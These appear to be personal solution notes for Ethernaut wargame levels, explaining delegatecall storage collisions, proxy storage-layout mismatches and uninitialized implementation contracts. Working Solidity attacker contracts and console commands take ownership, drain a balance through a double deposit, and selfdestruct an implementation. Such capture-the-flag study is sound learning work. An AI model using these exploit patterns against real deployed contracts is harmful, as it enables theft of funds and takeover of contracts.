## Ethernaut6 
    -Send a transaction to Delegation, triggering the fallback() 
    -The data "0xdd365b8b" == "pwn()", so it will trigget the pwn() function in the Delegate contract
    and it will change the owner state variable of Delegation contract
`await contract.sendTransaction({from: player, to: instance, data: "0xdd365b8b"})`

## Ethernaut 16

    -From Preservation contrat we will call setFirstTime(uint _timeStamp) function
    -This function will do a delegatecall to contract Library{} which will update the slot#0 variable in Preservation contract
    -So we will change the slot#0 in Preservation for a new attacker contract
    -So the second time we call the setFirstTime(uint _timeStamp), it won't call the Library contract, it will call our attacker contract
    -and our attacker contract will update the slot#2 on Preservation contract which is the owner()
```
contract Attacker{
    //same layout of Preservation contract
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 
    Preservation public target;

    constructor(Preservation _address){
        target = _address;
    }

    //1st step, change the slot#0 in Preservation-->   address public timeZone1Library;
    function setTimeZone1LibraryToAttackerContract() public {
        uint256 _addressUint = uint160(address(this));
        target.setFirstTime(_addressUint);
    }

    //2nd step, create a function that will update the slot#2
    //it must have the same signature "setTime(uint _time)"
    function setTime(uint _time) public {
        owner = msg.sender;
    }

    //NOTE: Instead of calling the setFirstTime(uint) from remix
    //I sent a transaction from the console:
    //await contract.setFirstTime(123)
}
```

## Ethernaut 24

```
interface IWallet{
    function admin() external view returns(address);
    function proposeNewAdmin(address _newAdmin) external;
    function approveNewAdmin(address _expectedAdmin) external;
    function setMaxBalance(uint256 _maxBalance) external;
    function addToWhitelist(address addr) external;
    function deposit() external payable;
    function execute(address to, uint256 value, bytes calldata data) external payable;
    function multicall(bytes[] calldata data) external payable;
}
```

    //vulnerability: layout of state variables are different in the proxy and the implementation
    //1 --> proposeNewAdmin in the proxy to become a
    // PuzzleProxy --> "pendingAdmin" == slot#0 
    // PuzzleWallet --> "owner" == slot#0
    //2 --> after being the pendingAdmin, in the implementation we are the "owner".
    //3 --> call addToWhitelist() and put my address in the whitelist mapping
    //4 --> Create 2 arrays to call multicall() --> [deposit(), multicall([deposit()])]
    //5 --> call multicall() sending the array _dataToCall with msg.value 0.001
    //5 --> because we call deposit() twice, our balance[msg.sender] == 0.002
    //6 --> send to msg.sender the balance of the proxy (0.002 ether)
    //7 --> setMaxBalance() will modify (maxBalance) on the implementation (slot#1)
    //7 --> and (admin), slot#1 in proxy
    //7 --> so we need to pass our address as a uint256 to update the slot#1

```
contract Attack{
    //_target = "0xf4921938D75189dc103A9297ce3A00C549B625F5"    
 
    constructor(IWallet _target) payable {
        _target.proposeNewAdmin(address(this)); //1
        _target.addToWhitelist(address(this)); //2 & 3
        bytes[] memory _depositSignature = new bytes[](1);//4
        _depositSignature[0] = abi.encodeWithSignature("deposit()");//4
        bytes[] memory _dataToCall = new bytes[](2); //4
        _dataToCall[0] = _depositSignature[0]; //4
        _dataToCall[1] = abi.encodeWithSelector(_target.multicall.selector, _depositSignature); //4
        _target.multicall{value: 0.001 ether}(_dataToCall); //5
        _target.execute(msg.sender, 0.002 ether, ""); //6
        uint256 _myAddress = uint256(uint160(bytes20(msg.sender))); //7 parseWallet to uint
        _target.setMaxBalance(_myAddress); //7
        require(_target.admin() == msg.sender,"Failed hacking"); 
    }
}
```

## Ethernaut 25 (proxy of the proxy)

    1. We will use getStorageAt() to get the address of the implementation contract
`await web3.eth.getStorageAt(contract.address,"_IMPLEMENTATION_SLOT")` 
    
    2. which is: 0x000000000000000000000000fd93a2ff533d97cab416f23d1c80c95cfe0e5bef
    0xfd93a2ff533d97cab416f23d1c80c95cfe0e5bef

    3. attack the implementation contract:

```
contract Attack{

    function attack(address _target) public{
        bytes memory functionSign = abi.encodeWithSignature("initialize()");
        (bool success, ) = _target.call(functionSign);
        require(success);
        bytes memory calldestroy = abi.encodeWithSignature("destroy()");
        bytes memory upgradeSign = abi.encodeWithSignature("upgradeToAndCall(address,bytes)", address(this),calldestroy);
        (bool success2, ) = _target.call(upgradeSign);
        require(success2);
    }

    function destroy() public{
        selfdestruct(payable(address(0)));
    }
}
```